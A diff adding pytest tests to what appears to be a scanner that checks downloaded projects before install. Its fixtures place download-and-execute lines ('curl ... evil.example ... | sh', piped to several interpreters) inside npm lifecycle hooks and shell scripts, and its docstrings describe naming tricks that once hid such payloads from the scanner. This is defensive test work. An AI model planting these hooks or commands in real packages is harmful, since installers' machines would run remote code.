@@ -740,3 +740,45 @@ def test_every_reason_not_to_install_is_printed(tmp_path):
     assert code == 1
     assert "8 reasons not to install this yet" in text
     assert all(f"203.0.113.{i}" in text for i in range(8))
+
+
+_PAYLOAD = "require('child_process').execSync('curl -s https://evil.example/x.sh | sh')\n"
+
+
+def _hook(cmd: str, **extra) -> str:
+    return json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": cmd}, **extra})
+
+
+@pytest.mark.parametrize("files", [
+    {"package.json": _hook("node test/setup"), "test/setup.js": _PAYLOAD},
+    {"package.json": _hook('node "./test/setup.js"'), "test/setup.js": _PAYLOAD},
+    {"package.json": _hook("node index.js"), "index.js": "require('./test/setup')\n",
+     "test/setup.js": _PAYLOAD},
+    {"package.json": _hook("node .", main="test/setup.js"), "test/setup.js": _PAYLOAD},
+    {"package.json": _hook("node ./lib"), "lib/index.js": _PAYLOAD},
+    {"package.json": _hook("sh scripts/run.sh"), "scripts/run.sh": ". ./test/env.sh\n",
+     "scripts/test/env.sh": "curl -s https://evil.example/x.sh | sh\n"},
+], ids=["extensionless", "quoted", "required", "main", "directory", "sourced"])
+def test_code_an_install_hook_runs_is_scanned_however_it_is_named(tmp_path, files):
+    """Test directories are skipped, except for code an install hook runs. That
+    exception used to hold only for a literal `x.js` in the command, so naming
+    the payload the way node or sh actually accept it kept it out of sight."""
+    result = analyze_preflight(_tree(tmp_path, files))
+    gating = [f for f in result.gating() if f.rule == "download-and-execute"]
+    assert gating, [f"{f.severity}:{f.rule}@{f.where}" for f in result.findings]
+
+
+def test_every_lifecycle_script_npm_install_runs_is_read(tmp_path):
+    """A local `npm install` in a downloaded project also runs preprepare,
+    postprepare and (npm 6) prepublish."""
+    for key in ("prepublish", "preprepare", "postprepare"):
+        root = _tree(tmp_path / key, {"package.json": json.dumps({
+            "name": "x", "version": "1", "scripts": {key: "curl -s https://evil.example/x | sh"},
+        })})
+        assert [f.rule for f in analyze_preflight(root).gating()] == ["install-hook-downloader"], key
+
+
+@pytest.mark.parametrize("pipe", ["python3 -", "sudo -E bash", "node", "perl"])
+def test_download_piped_to_any_interpreter_is_download_and_execute(tmp_path, pipe):
+    root = _tree(tmp_path, {"install.sh": f"#!/bin/sh\ncurl -fsSL https://evil.example/p | {pipe}\n"})
+    assert [f.rule for f in analyze_preflight(root).gating()] == ["download-and-execute"]
